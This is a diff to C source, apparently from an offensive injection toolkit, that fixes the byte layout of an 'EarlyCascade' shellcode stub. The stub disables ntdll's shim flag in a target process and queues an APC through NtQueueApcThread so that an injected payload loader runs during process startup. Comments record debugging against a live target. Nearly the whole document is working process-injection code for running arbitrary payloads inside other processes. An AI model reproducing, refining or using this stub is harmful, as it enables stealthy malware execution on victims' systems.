@@ -157,17 +157,21 @@ static void ec_build_stub(unsigned char * stub, unsigned char * payload,
                           void * pNtQueueApcThread, void * lpParameter)
 {
 	memset(stub, 0xCC, EC_STUB_SIZE);
-	/* stub v3 (live-forensics iteration 2026-11-11):
-	 *  - g_ShimsEnabled via ABSOLUTE address (rip-rel disp32 cannot span
-	 *    heap->ntdll; v1 hung the loader on a bogus VA)
-	 *  - NtQueueApcThread(ThreadHandle=-2, ApcRoutine=payload,
-	 *    ApcArgument1=parameter, 0, 0): the APC dispatcher calls the routine
-	 *    as (arg1->RCX, arg2, arg3) which matches the ThreadProc(LPVOID)
-	 *    shape of the injected loader entry - v2 zeroed arg1 and the payload
-	 *    ran with NULL parameters (DllMain got lpReserved=NULL -> crash)
-	 *  - [rsp+0x20]=0 for the 5th arg home (v2 left stack garbage there)
-	 *  - sub rsp,0x28 keeps 16-byte alignment at the call
-	 * Layout (fixed offsets):
+	/* stub v4 (2026-11-12, harness byte-diff forensics):
+	 * v3 had TWO bugs, both proven locally (tools/ec_stage2_harness*.py,
+	 * exit 0x1337 end-to-end PASS with the fixed bytes):
+	 *  1. the arg5 zero write (9 bytes: 48 C7 44 24 20 + imm32) OVERLAPPED
+	 *     the next instruction: stub[0x33]=0x48 clobbered the imm32's top
+	 *     byte and the decoder then ate that 0x48 as the immediate, so the
+	 *     stream executed `mov qword [rsp+20h], 0x48000000` +
+	 *     `mov ecx, 0xFFFFFFFE` - ecx zero-extends, rcx became
+	 *     0x00000000FFFFFFFE, NOT the canonical kernel pseudo-handle -2 ->
+	 *     NtQueueApcThread returned 0xC0000008 (harness v5: three straight
+	 *     runs, status captured from the target scratch page)
+	 *  2. no `add rsp,28h` before `ret` - the stack frame was left skewed,
+	 *     the stub returned into garbage mid-LdrpSendPostSnapNotifications
+	 *     -> LdrpInitializationFailure (armed-patsy live forensics)
+	 * Fixed layout (disjoint offsets, 0x4C bytes):
 	 *  00: 48 B8 <shims64>      mov rax, g_ShimsEnabled
 	 *  0A: C6 00 00             mov byte [rax], 0
 	 *  0D: 49 B8 <param64>      mov r8, parameter
@@ -175,11 +179,12 @@ static void ec_build_stub(unsigned char * stub, unsigned char * payload,
 	 *  21: 48 89 C2             mov rdx, rax
 	 *  24: 4D 31 C9             xor r9, r9
 	 *  27: 48 83 EC 28          sub rsp, 28h
-	 *  2B: 48 C7 44 24 20 0*4   mov qword [rsp+20h], 0
-	 *  33: 48 C7 C1 FEFFFFFF    mov rcx, -2
-	 *  3A: 48 B8 <ntqapc64>     mov rax, NtQueueApcThread
-	 *  44: FF D0                call rax
-	 *  46: C3                   ret
+	 *  2B: 48 C7 44 24 20 00000000  mov qword [rsp+20h], 0   (9 bytes)
+	 *  34: 48 C7 C1 FEFFFFFF    mov rcx, -2                  (7 bytes)
+	 *  3B: 48 B8 <ntqapc64>     mov rax, NtQueueApcThread    (10 bytes)
+	 *  45: FF D0                call rax
+	 *  47: 48 83 C4 28          add rsp, 28h
+	 *  4B: C3                   ret
 	 */
 	stub[0x00] = 0x48; stub[0x01] = 0xB8;
 	*(unsigned long long *)(stub + 0x02) = (unsigned long long)(size_t)shimsEnabledInTarget;
@@ -193,12 +198,13 @@ static void ec_build_stub(unsigned char * stub, unsigned char * payload,
 	stub[0x27] = 0x48; stub[0x28] = 0x83; stub[0x29] = 0xEC; stub[0x2A] = 0x28;
 	stub[0x2B] = 0x48; stub[0x2C] = 0xC7; stub[0x2D] = 0x44; stub[0x2E] = 0x24; stub[0x2F] = 0x20;
 	*(int *)(stub + 0x30) = 0;
-	stub[0x33] = 0x48; stub[0x34] = 0xC7; stub[0x35] = 0xC1;
-	*(int *)(stub + 0x36) = -2;
-	stub[0x3A] = 0x48; stub[0x3B] = 0xB8;
-	*(unsigned long long *)(stub + 0x3C) = (unsigned long long)(size_t)pNtQueueApcThread;
-	stub[0x44] = 0xFF; stub[0x45] = 0xD0;
-	stub[0x46] = 0xC3;
+	stub[0x34] = 0x48; stub[0x35] = 0xC7; stub[0x36] = 0xC1;
+	*(int *)(stub + 0x37) = -2;
+	stub[0x3B] = 0x48; stub[0x3C] = 0xB8;
+	*(unsigned long long *)(stub + 0x3D) = (unsigned long long)(size_t)pNtQueueApcThread;
+	stub[0x45] = 0xFF; stub[0x46] = 0xD0;
+	stub[0x47] = 0x48; stub[0x48] = 0x83; stub[0x49] = 0xC4; stub[0x4A] = 0x28;
+	stub[0x4B] = 0xC3;
 }
 
 BOOL inject_via_earlycascade(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter)
